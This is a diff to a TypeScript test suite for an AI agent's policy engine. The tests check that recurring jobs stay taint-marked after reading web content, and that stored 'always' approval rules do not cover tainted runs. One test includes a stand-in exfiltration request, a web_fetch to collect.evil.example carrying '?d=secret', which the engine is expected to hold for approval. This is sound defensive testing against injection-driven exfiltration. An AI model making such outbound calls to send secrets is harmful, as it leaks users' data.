@@ -17,9 +17,11 @@ import type { ProviderConfig } from "../src/models/providers";
 import { Router } from "../src/models/router";
 import { addTaint, createRunContext } from "../src/policy/context";
 import { taskTaint } from "../src/policy/carry";
+import { decide } from "../src/policy/engine";
 import { resetPolicyHooks, setPolicyHooks } from "../src/policy/hooks";
 import type { RunContext, TaintSource } from "../src/policy/types";
 import { resetS2Startup } from "../src/startup/s2";
+import { addApprovalRule, approvalTarget } from "../src/stores/approval-rules";
 import { enqueueJob, listJobs, parseJobPayload } from "../src/stores/jobs";
 import { createThread } from "../src/stores/threads";
 import { registerDelegateTaskTool } from "../src/tools/delegate-task-tool";
@@ -48,14 +50,14 @@ const past = (): string => new Date(Date.now() - 1_000).toISOString();
 let db: Database | undefined;
 afterEach(() => { db?.close(); db = undefined; resetPolicyHooks(); resetS2Startup(); });
 
-interface Seen { principal: string; sources: Array<{ kind: string; label: string }> }
+interface Seen { principal: string; sources: Array<{ kind: string; label: string }>; run: RunContext }
 /** The taint every run that makes a call has when it makes its first call; `read` runs first and may mark the run, as reading a page would. */
 function watch(read?: (run: RunContext) => void): Seen[] {
   const seen: Seen[] = [];
   setPolicyHooks({
     isRunPaused: (run) => {
       read?.(run);
-      seen.push({ principal: run.principal.kind, sources: run.taint.sources.map((source) => ({ kind: source.kind, label: source.label })) });
+      seen.push({ principal: run.principal.kind, sources: run.taint.sources.map((source) => ({ kind: source.kind, label: source.label })), run });
       return null;
     },
   });
@@ -101,16 +103,49 @@ describe("the next fire of a recurring job", () => {
     expect(kinds(second[0])).toEqual([]);
   });
 
-  test("of a job the owner made is not marked: the owner is present", async () => {
+  test("of a job the owner made is marked too: the owner is not present at a fire", async () => {
     db = openDatabase(":memory:");
     enqueueJob(db, { kind: "turn", payload: { agentID: "ea", text: "check the inbox", notify: false, ownerOnly: true, everyMs: 3_600_000 } });
+    const first = watch(READS_A_PAGE);
+    await fire(db, callThenAnswer);
+    expect(first[0]!.principal, "the owner's job did not run as the owner; the test is out of step").toBe("owner");
+    expect(kinds(first[0]), "fire 1 was not marked; the test is out of step").toContain("web");
+    makeDue(db);
+    const second = watch();
+    await fire(db, callThenAnswer);
+    expect(second.length, "fire 2 never made a call").toBeGreaterThan(0);
+    expect(second[0]!.principal).toBe("owner");
+    expect(kinds(second[0]), "fire 2 of the owner's job started clean over a thread a tainted run wrote in").toContain("history");
+  });
+
+  test("of a job the owner made asks to send to an unnamed host, and no stored 'always' rule answers for it", async () => {
+    db = openDatabase(":memory:");
+    const loadsMail = [() => callResponse("load_tools", { names: ["mail_send"] }), () => textResponse("Done.")];
+    enqueueJob(db, { kind: "turn", payload: { agentID: "ea", text: "check the inbox", notify: false, ownerOnly: true, everyMs: 3_600_000 } });
     watch(READS_A_PAGE);
+    await fire(db, loadsMail);
+    makeDue(db);
+    const second = watch();
+    await fire(db, loadsMail);
+    const run = second[0]!.run;
+    const send = { account: "owner", to: ["a@b.c"], subject: "hi", body: "b" };
+    addApprovalRule(db, { agentID: run.bot, toolName: "mail_send", target: approvalTarget("mail_send", send)! });
+    const egress = decide(run, { tool: "web_fetch", args: { url: "https://collect.evil.example/?d=secret" }, callID: "c1" }, { record: false });
+    expect(egress.action, "an unnamed host was let through on a fire after a tainted one").toBe("ask");
+    if (egress.action === "ask") expect(egress.card.unnamedDestinations).toEqual(["collect.evil.example"]);
+    const ruled = decide(run, { tool: "mail_send", args: send, callID: "c2" }, { record: false });
+    expect(ruled.action === "refuse" ? ruled.error : ruled.action, "a stored always-rule answered for a tainted fire").toBe("ask");
+  });
+
+  test("of a job the owner made starts clean when the fire before it read nothing outside", async () => {
+    db = openDatabase(":memory:");
+    enqueueJob(db, { kind: "turn", payload: { agentID: "ea", text: "check the inbox", notify: false, ownerOnly: true, everyMs: 3_600_000 } });
+    watch();
     await fire(db, callThenAnswer);
     makeDue(db);
     const second = watch();
     await fire(db, callThenAnswer);
     expect(second.length).toBeGreaterThan(0);
-    expect(second[0]!.principal).toBe("owner");
     expect(kinds(second[0])).toEqual([]);
   });
 });
